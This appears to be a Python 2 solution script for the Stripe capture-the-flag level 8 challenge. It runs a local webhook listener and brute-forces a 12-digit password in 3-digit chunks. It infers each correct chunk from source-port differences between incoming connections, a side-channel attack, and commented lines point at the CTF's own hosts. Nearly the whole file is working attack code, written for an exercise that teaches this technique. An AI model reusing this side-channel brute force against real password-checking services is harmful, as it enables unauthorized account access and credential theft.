import SocketServer
import subprocess
import sys
import httplib, urllib
import os
import time
from threading import Thread

HOST = 'localhost'
#HOST = 'level02-4.stripe-ctf.com'
PORT = 2000
#PORT = 17123

BASE_DIFF = 3
#PROD
#BASE_DIFF = 2

lastport = 0

chunk1 = 000
chunk2 = 000
chunk3 = 000
chunk4 = 000

currentChunk = 1

#we gets tons of false positives on prod because of all the socket thrashing so we'll
#wait until we've had a chunk succeed 5 times before calling it
success = 0
successChunk = 0

basePayload = '{"webhooks": ["localhost:2000"], '
#basePayload = '{"webhooks": ["level02-4.stripe-ctf.com:17123"], '


def sendNextRequest():
    #time.sleep(1);
    print "sending next request"
    payload = basePayload + '"password": "' + str(chunk1).zfill(3) + str(chunk2).zfill(3) + str(chunk3).zfill(3) + str(chunk4).zfill(3) + '"}'

    print payload

    headers = {"Content-type": "application/x-www-form-urlencoded",
               "Accept": "text/plain"}

    conn = httplib.HTTPConnection("127.0.0.1:3000")
    conn.request("POST", "", payload, headers)
    #conn = httplib.HTTPSConnection("level08-4.stripe-ctf.com")
    #conn.request("POST", "/user-tltuusmjvy/", payload, headers)
    reponse = conn.getresponse()
    print reponse.status

def getSuccessDiff(chunk):
    return chunk + BASE_DIFF

def getCurrentChunk(currentChunk):
    global chunk1, chunk2, chunk3, chunk4
    if currentChunk == 1:
        return chunk1
    elif currentChunk == 2:
        return chunk2
    elif currentChunk == 3:
        return chunk3
    elif currentChunk == 4:
        return chunk4
    else:
        print "wtf mate"

def incrementChunk(currentChunk):
    global chunk1, chunk2, chunk3, chunk4
    if currentChunk == 1:
        chunk1 += 1
    elif currentChunk == 2:
        chunk2 += 1
    elif currentChunk == 3:
        chunk3 += 1
    elif currentChunk == 4:
        chunk4 += 1
    else:
        print "wtf mate"
    
class SingleTCPHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        global lastport, chunk1, chunk2, chunk3, chunk4, currentChunk, success, successChunk

        if currentChunk < 4:

            thisport = self.request.getpeername()[1]
            print thisport
            diff = thisport - lastport

            print diff

            successDiff = getSuccessDiff(currentChunk)
        
            if diff == successDiff - 1:
                print "Negative"
                incrementChunk(currentChunk)
            elif diff == successDiff:
                print "possibly correct"
                if success == 5:
                    #printChunk(currentChunk)
                    print "we found it!"
                
                    currentChunk += 1
            
                if successChunk == getCurrentChunk(currentChunk):
                    success +=1
                else:
                    success = 0
                    successChunk = getCurrentChunk(currentChunk)
            else:
                print "eh?"
    
            lastport = thisport
        else:
            # On the 4th chunk there's no port diff to check, we need to look at the actual data returned
            data = self.request.recv(1024)
            print data;

            if '{"success": true}' in data:
                print "we're done!"
                os._exit(1)
            else:
                print "it didn't match"
                chunk4 += 1


        reply = "HTTP/1.1 200 OK\n hi"
        self.request.send(reply)
        self.request.close()

        sendNextRequest()

class SimpleServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, server_address, RequestHandlerClass):
        SocketServer.TCPServer.__init__(self, server_address, RequestHandlerClass)

if __name__ == "__main__":
    server = SimpleServer(('', PORT), SingleTCPHandler)
    # terminate with Ctrl-C
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        traceback.print_exc(file=sys.stdout)
        sys.exit(0)
